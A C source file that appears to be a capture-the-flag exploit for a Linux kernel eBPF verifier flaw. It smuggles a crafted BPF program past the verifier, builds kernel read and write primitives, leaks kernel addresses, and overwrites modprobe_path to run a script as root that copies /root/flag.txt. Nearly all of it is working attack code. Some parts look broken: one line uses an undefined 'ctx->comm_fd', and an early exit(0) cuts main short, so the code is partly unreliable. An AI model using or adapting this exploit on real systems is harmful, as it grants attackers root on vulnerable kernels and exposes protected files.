//gcc -o exp ./exp.c
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/wait.h>
#include <linux/bpf.h>
#include <sys/mman.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <stddef.h>

#ifndef __NR_BPF
#define __NR_BPF 321
#endif
#define ptr_to_u64(ptr) ((__u64)(unsigned long)(ptr))

#define BPF_ALSH	0xe0

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
	((struct bpf_insn){                        \
		.code = CODE,                          \
		.dst_reg = DST,                        \
		.src_reg = SRC,                        \
		.off = OFF,                            \
		.imm = IMM})

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)    \
	((struct bpf_insn){                    \
		.code = BPF_LD | BPF_DW | BPF_IMM, \
		.dst_reg = DST,                    \
		.src_reg = SRC,                    \
		.off = 0,                          \
		.imm = (__u32)(IMM)}),             \
		((struct bpf_insn){                \
			.code = 0,                     \
			.dst_reg = 0,                  \
			.src_reg = 0,                  \
			.off = 0,                      \
			.imm = ((__u64)(IMM)) >> 32})

#define BPF_MOV64_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_MOV_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_X, DST, SRC, 0, 0)

#define BPF_MOV64_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)

#define BPF_MOV_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_RSH_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_RSH | BPF_X, DST, SRC, 0, 0)

#define BPF_LSH_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_LSH | BPF_K, DST, 0, 0, IMM)

#define BPF_ALSH64_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_ALSH | BPF_K, DST, 0, 0, IMM)

#define BPF_ALU64_IMM(OP, DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)

#define BPF_ALU64_REG(OP, DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_X, DST, SRC, 0, 0)

#define BPF_ALU_IMM(OP, DST, IMM) BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)

#define BPF_ALU_REG(OP, DST, SRC) BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_X, DST, SRC, 0, 0)

#define BPF_JMP_IMM(OP, DST, IMM, OFF) BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_JMP_REG(OP, DST, SRC, OFF) BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)

#define BPF_JMP32_REG(OP, DST, SRC, OFF) BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)

#define BPF_JMP32_IMM(OP, DST, IMM, OFF) BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_EXIT_INSN() BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)

#define BPF_LD_MAP_FD(DST, MAP_FD) BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)

#define BPF_LD_IMM64(DST, IMM) BPF_LD_IMM64_RAW(DST, 0, IMM)

#define BPF_ST_MEM(SIZE, DST, OFF, IMM) BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, DST, 0, OFF, IMM)

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) BPF_RAW_INSN(BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

#define BPF_STX_MEM(SIZE, DST, SRC, OFF) BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

int doredact = 0;
#define LOG_BUF_SIZE 65536
char bpf_log_buf[LOG_BUF_SIZE];
char buffer[64];
int sockets[2];
int mapfd;

void fail(const char *fmt, ...)
{
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[!] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
	exit(1);
}

void redact(const char *fmt, ...)
{
	va_list args;
	va_start(args, fmt);
	if (doredact)
	{
		fprintf(stdout, "[!] ( ( R E D A C T E D ) )\n");
		return;
	}
	fprintf(stdout, "[*] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
}

void msg(const char *fmt, ...)
{
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[*] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
}

int bpf_create_map(enum bpf_map_type map_type,
				   unsigned int key_size,
				   unsigned int value_size,
				   unsigned int max_entries)
{
	union bpf_attr attr = {
		.map_type = map_type,
		.key_size = key_size,
		.value_size = value_size,
		.max_entries = max_entries};

	return syscall(__NR_BPF, BPF_MAP_CREATE, &attr, sizeof(attr));
}

int bpf_obj_get_info_by_fd(int fd, const unsigned int info_len, void *info)
{
	union bpf_attr attr;
	memset(&attr, 0, sizeof(attr));
	attr.info.bpf_fd = fd;
	attr.info.info_len = info_len;
	attr.info.info = ptr_to_u64(info);
	return syscall(__NR_BPF, BPF_OBJ_GET_INFO_BY_FD, &attr, sizeof(attr));
}

int bpf_lookup_elem(int fd, const void *key, void *value)
{
	union bpf_attr attr = {
		.map_fd = fd,
		.key = ptr_to_u64(key),
		.value = ptr_to_u64(value),
	};

	return syscall(__NR_BPF, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

int bpf_update_elem(int fd, const void *key, const void *value,
					uint64_t flags)
{
	union bpf_attr attr = {
		.map_fd = fd,
		.key = ptr_to_u64(key),
		.value = ptr_to_u64(value),
		.flags = flags,
	};

	return syscall(__NR_BPF, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

int bpf_prog_load(enum bpf_prog_type type,
				  const struct bpf_insn *insns, int insn_cnt,
				  const char *license)
{
	union bpf_attr attr = {
		.prog_type = type,
		.insns = ptr_to_u64(insns),
		.insn_cnt = insn_cnt,
		.license = ptr_to_u64(license),
		.log_buf = ptr_to_u64(bpf_log_buf),
		.log_size = LOG_BUF_SIZE,
		.log_level = 1,
	};
	// union bpf_attr attr = {
	// 	.prog_type = type,
	// 	.insns = ptr_to_u64(insns),
	// 	.insn_cnt = insn_cnt,
	// 	.license = ptr_to_u64(license),
	// 	.log_buf = 0,
	// 	.log_size = 0,
	// 	.log_level = 0,
	// };

	return syscall(__NR_BPF, BPF_PROG_LOAD, &attr, sizeof(attr));
}


#define BPF_LD_ABS(SIZE, IMM)                      \
	((struct bpf_insn){                            \
		.code = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \
		.dst_reg = 0,                              \
		.src_reg = 0,                              \
		.off = 0,                                  \
		.imm = IMM})

#define BPF_MAP_GET(idx, dst)                                                \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                                     \
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \
		BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                              \
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \
		BPF_EXIT_INSN(),                                                     \
		BPF_LDX_MEM(BPF_DW, dst, BPF_REG_0, 0),                              \
		BPF_MOV64_IMM(BPF_REG_0, 0)

#define BPF_MAP_GET_ADDR(idx, dst)											 \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                                     \
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \
		BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                              \
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \
		BPF_EXIT_INSN(),                                                     \
		BPF_MOV64_REG((dst), BPF_REG_0),                              \
		BPF_MOV64_IMM(BPF_REG_0, 0)

int load_prog()
{
	struct bpf_insn prog[] = {
    BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),

    // r0 = bpf_lookup_elem(ctx->comm_fd, 0)
    BPF_LD_MAP_FD(BPF_REG_1, mapfd),
    BPF_ST_MEM(BPF_DW, BPF_REG_10, -8, 0),
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),

    // if (r0 == NULL) exit(1)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
    BPF_MOV64_IMM(BPF_REG_0, 1),
    BPF_EXIT_INSN(),

    // r8 = r0
    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),

    // this is bug
    BPF_MOV64_IMM(BPF_REG_2, 64),
    BPF_MOV64_IMM(BPF_REG_1, 1),
    BPF_RSH_REG(BPF_REG_1, BPF_REG_2),
    BPF_MOV64_IMM(BPF_REG_0, 0),

    // verifier believe r0 = 0 and r1 = 0. However, r0 = 0 and  r1 = 1 on runtime.

    // r7 = r1 + 8
    BPF_MOV64_REG(BPF_REG_7, BPF_REG_1),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 8),

    // verifier believe r7 = 8, but r7 = 9 actually.

    // store the array pointer (0xFFFF..........10 + 0xE0)
    BPF_MOV64_REG(BPF_REG_6, BPF_REG_8),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0xE0),
    BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_6, -8),

    // partial overwrite array pointer on stack

    // r0 = bpf_skb_load_bytes_relative(r9, 0, r8, r7, 0)
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),
    BPF_MOV64_IMM(BPF_REG_2, 0),
    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -16),
    BPF_MOV64_REG(BPF_REG_4, BPF_REG_7),
    BPF_MOV64_IMM(BPF_REG_5, 1),
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes_relative),

    // r6 = 0xFFFF..........00 (off = 0xE0)
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_10, -8),
    BPF_ALU64_IMM(BPF_SUB, BPF_REG_6, 0xE0),

    
    // map_update_elem(ctx->comm_fd, 0, r6, 0)
    BPF_LD_MAP_FD(BPF_REG_1, ctx->comm_fd),
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_8),
    BPF_MOV64_REG(BPF_REG_3, BPF_REG_6),
    BPF_MOV64_IMM(BPF_REG_4, 0),
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_update_elem),

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
	};
	printf("SIZE: %d\n", sizeof(prog) / sizeof(struct bpf_insn));
	return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog) / sizeof(struct bpf_insn), "GPL");
}

int write_msg()
{
	ssize_t n = write(sockets[0], buffer, sizeof(buffer));
	if (n < 0)
	{
		perror("write");
		return 1;
	}
	if (n != sizeof(buffer))
	{
		fprintf(stderr, "short write: %d\n", n);
	}
	return 0;
}

void update_elem(int key, size_t val)
{
	if (bpf_update_elem(mapfd, &key, &val, 0)) {
		fail("bpf_update_elem failed '%s'\n", strerror(errno));
	}
}

size_t get_elem(int key)
{
	size_t val;
	if (bpf_lookup_elem(mapfd, &key, &val)) {
		fail("bpf_lookup_elem failed '%s'\n", strerror(errno));
	}
	return val;
}

size_t read64(size_t addr)
{
	uint32_t lo, hi;
	char buf[0x50] = {0};
	update_elem(1, 1);
	update_elem(2, addr-0x58);
	write_msg();
	if (bpf_obj_get_info_by_fd(mapfd, 0x50, buf)) {
		fail("bpf_obj_get_info_by_fd failed '%s'\n", strerror(errno));
	}
	lo = *(unsigned int*)&buf[0x40];
	update_elem(2, addr-0x58+4);
	write_msg();
	if (bpf_obj_get_info_by_fd(mapfd, 0x50, buf)) {
		fail("bpf_obj_get_info_by_fd failed '%s'\n", strerror(errno));
	}
	hi = *(unsigned int*)&buf[0x40];
	return (((size_t)hi) << 32) | lo;
}	

void clear_btf()
{
	update_elem(0, 2);
	update_elem(1, 1);
	update_elem(2, 0);
	write_msg();
}

void write32(size_t addr, uint32_t data)
{
	uint64_t key = 0;
	data -= 1;
	if (bpf_update_elem(mapfd, &key, &data, addr)) {
		fail("bpf_update_elem failed '%s'\n", strerror(errno));
	}
}
void write64(size_t addr, size_t data)
{
	uint32_t lo = data & 0xffffffff;
	uint32_t hi = (data & 0xffffffff00000000) >> 32;
	uint64_t key = 0;
	write32(addr, lo);
	write32(addr+4, hi);
}


int main()
{
	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long), 0x100);
	if (mapfd < 0)
	{
		fail("failed to create map '%s'\n", strerror(errno));
	}
	redact("sneaking evil bpf past the verifier\n");
	int progfd = load_prog();
	printf("%s\n", bpf_log_buf);
	if (progfd < 0)
	{
		if (errno == EACCES)
		{
			msg("log:\n%s", bpf_log_buf);
		}
		printf("%s\n", bpf_log_buf);
		fail("failed to load prog '%s'\n", strerror(errno));
	}

	redact("creating socketpair()\n");
	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
	{
		fail("failed to create socket pair '%s'\n", strerror(errno));
	}

	redact("attaching bpf backdoor to socket\n");
	if (setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0)
	{
		fail("setsockopt '%s'\n", strerror(errno));
	}

	update_elem(0, -1);
	update_elem(8, 64);
	update_elem(4, 0x1337);
	write_msg();

	size_t ops_addr = get_elem(4);
	printf("%llx\n", ops_addr);
	exit(0);

	// Copy ops array
	char ops[0xe8] = {0};
	for(int i=0;i<0xe8;i+=8)
		{
			*(size_t*)&ops[i] = read64(ops_addr + i);
			update_elem(0x10+i/8, *(size_t*)&ops[i]);
			printf("Read ops %x %llx\n", i, *(size_t*)&ops[i]);
		}

	// Heap leak
	update_elem(0, -1);
	update_elem(8, 64);
	update_elem(1, 2);
	write_msg();
	size_t map_leak = get_elem(4) - 0xc0;
	size_t fake_ops = map_leak + 0x110 + 0x8*0x10;
	printf("Fakeops:%llx\n", fake_ops);


	// Get arb write
	update_elem(0x10+0x78/8, *(size_t*)&ops[0x20]);

	update_elem(0, -1);
	update_elem(8, 64);
	update_elem(1, 3);
	update_elem(2, fake_ops);
	write_msg();

	size_t kernel_base = ops_addr - 0xc12dc0;
	size_t modprobe_path = kernel_base + 0xe38340;
	printf("Modeprobe:%llx\n", modprobe_path);

	write32(modprobe_path, 0x706d742f);
	write32(modprobe_path+4, 0x732e612f);
	write32(modprobe_path+8, 0x68);

	system("echo -ne '#!/bin/sh\\n/bin/cp /root/flag.txt /tmp/flag\\n/bin/chmod 777 /tmp/flag' > /tmp/a.sh");
  system("chmod +x /tmp/a.sh");
  system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/ll");
  system("chmod +x /tmp/ll");
  system("/tmp/ll");
  system("cat /tmp/flag");

  while (1) {}
}
